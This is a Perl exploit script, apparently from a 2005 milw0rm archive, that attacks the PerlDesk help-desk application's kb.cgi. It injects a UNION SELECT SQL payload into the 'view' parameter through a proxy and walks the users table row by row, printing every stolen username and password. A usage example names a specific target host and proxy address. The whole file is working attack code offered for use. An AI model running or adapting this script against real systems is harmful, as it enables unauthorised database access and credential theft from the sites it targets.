#!/usr/bin/perl

# Example:
# kb.cgi?view=0 UNION SELECT 1,3,password,username,3,7 FROM users

# Exploit is attached.
# ./pde.pl www.internethosting4u.com /perldesk/kb.cgi 148.244.150.58:80

use IO::Socket;

print '
########################################################
# PerlDesk exploit
#
# Usage: ./pdsploit.pl host path proxy
#
#
#
# Vunerability discovered by
#
# deluxe89 and Astovidatu [ www.security-project.org ]
#
#
#
# Special thanks to doc and WebDoctor�s
#
########################################################

';

if($#ARGV != 2)
{
       exit;
}

$host = $ARGV[0];
$path = $ARGV[1];
$proxy = $ARGV[2];
($addr, $port) = split(/:/, $proxy);

$offset = 0;

while(1)
{
       $value =
"view=0%20UNION%20SELECT%20'0','0',CONCAT('_P',password,'P_'),CONCAT('_U',username,'U_'),'0','0'%20FROM%20users%20LIMIT%20$offset,1";

       $socket = IO::Socket::INET->new(Proto => "tcp",
PeerAddr => $addr, PeerPort => $port) || die "[-]
Proxy doesn't work\n";
       print $socket "GET http://$host$path?$value
HTTP/1.1\nHost: $host\n\n";

       $user = '';
       $pass = '';
       while(defined(my $data = <$socket>))
       {
               if($data =~ m/_P(.*)P_/)
               {
                       $pass = $1;
               }
               if($data =~ m/_U(.*)U_/)
               {
                       $user = $1;
               }
       }

       if($user ne '' && $pass ne '')
       {
               print "$user:$pass\n";
       }
       else
       {
               die "[+] Finished\n";
       }

       $offset++;
}

# code by deluxe89 [ www.security-project.org ]

# milw0rm.com [2005-02-05]